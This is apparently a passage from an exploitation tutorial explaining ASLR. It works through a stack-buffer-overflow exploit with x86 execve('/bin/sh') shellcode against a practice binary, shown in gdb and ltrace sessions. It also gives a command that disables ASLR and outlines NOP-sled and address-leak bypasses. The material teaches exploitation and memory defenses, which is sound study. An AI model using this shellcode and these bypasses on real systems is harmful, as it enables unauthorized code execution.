# Address Space Layout Randomization(ASLR)

Prevents the attacker from jumping to the shellcode wherever by randomize the address space of a process. So, if you want to jump to a concrete address, for example, `0xffffcfdd`, you can't do it directly, because every time you execute the program, its address space changes. I disabled it before with `echo "0" | sudo dd of=/proc/sys/kernel/randomize_va_space`. Also, it makes it difficult to use `ret2libc attack`, because in this attack, you need to locate needed functions and with ASLR they will have random addresses.

Let's again try the stack-overflow exploit.
```bash
$ sudo cat /proc/sys/kernel/randomize_va_space              
2
```

2 indicates that ASLR is enabled.
```bash
gef➤  unset environment LINES
gef➤  unset environment COLUMNS
gef➤  r < <(python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A" * 239 + "\xda\xce\xff\xff"')
Starting program: /home/shogun/repos/basics-of-pwn/content/security-techniques/stack-overflow-for-aslr < <(python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A" * 239 + "\xda\xce\xff\xff"')

Program received signal SIGILL, Illegal instruction.
0xffffcfd6 in ?? ()
gef➤  x/100wx $esp - 0x10e
0xffffcec6:	0x0003ffff	0x92240000	0xd0000804	0xd76cf7ff
0xffffced6:	0x6850c031	0x68732f2f	0x69622f68	0x50e3896e
0xffffcee6:	0xb0e18953	0x4180cd0b	0x41414141	0x41414141
0xffffcef6:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcf06:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcf16:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcf26:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcf36:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcf46:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcf56:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcf66:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcf76:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcf86:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcf96:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcfa6:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcfb6:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcfc6:	0x41414141	0x41414141	0x41414141	0xcfdc4141
0xffffcfd6:	0xce16ffff	0x622fffff	0x70006e69	0x7000f7fa
0xffffcfe6:	0x0000f7fa	0xaee50000	0x0001f7dd	0xd0840000
0xffffcff6:	0xd08cffff	0xd014ffff	0x7000ffff	0x0000f7fa
0xffffd006:	0xd0680000	0x0000ffff	0xd0000000	0x0000f7ff
0xffffd016:	0x70000000	0x7000f7fa	0x0000f7fa	0x93dd0000
0xffffd026:	0x35cd4860	0x00000ca2	0x00000000	0x00000000
0xffffd036:	0x00010000	0x90c00000	0x00000804	0x7cd40000
0xffffd046:	0x2410f7fe	0xc000f7fe	0x00010804	0x90c00000
gef➤
```

Okay, try to change the return address:
```bash
gef➤  unset environment LINES
gef➤  unset environment COLUMNS
gef➤  r < <(python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A" * 239 + "\xd6\xce\xff\xff"')
Starting program: /home/shogun/repos/basics-of-pwn/content/security-techniques/stack-overflow-for-aslr < <(python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A" * 239 + "\xd6\xce\xff\xff"')
process 58805 is executing new program: /bin/dash
[Inferior 1 (process 58805) exited normally]
gef➤
```

Now, try it outside gdb with ltrace to see the addresses.
```bash
$ (python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A" * 239 + "\xda\xce\xff\xff"'; cat) | ltrace ./stack-overflow-for-aslr
__libc_start_main(0x8049243, 1, 0xff9226f4, 0x8049270 <unfinished ...>
gets(0xff922546, 0xff922580, 3, 0x8049224)                         = 0xff922546
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
w
$ (python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A" * 239 + "\xda\xce\xff\xff"'; cat) | ltrace ./stack-overflow-for-aslr
__libc_start_main(0x8049243, 1, 0xffc80924, 0x8049270 <unfinished ...>
gets(0xffc80776, 0xffc807b0, 3, 0x8049224)                         = 0xffc80776
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
w
$ (python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A" * 239 + "\xda\xce\xff\xff"'; cat) | ltrace ./stack-overflow-for-aslr w
__libc_start_main(0x8049243, 2, 0xffaa87a4, 0x8049270 <unfinished ...>
gets(0xffaa85f6, 0xffaa8630, 3, 0x8049224)                         = 0xffaa85f6
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
w
```
Each time I run the program ltrace showed a different address. python script with ret2libc attack won't work too. ASLR can be evaded with the next method: place a large nop-chain with shellcode in the env variable and then jump to it. Of course, you must have the access to env variable and, also, you must check that the env variables will not be cleaned. You need a large payload here to increase the probability of jumping to your shellcode. Also, you have another method through leaking the single address within the program. If you can do it, then you can calculate the offset from the non-random address and use it in future attacks.
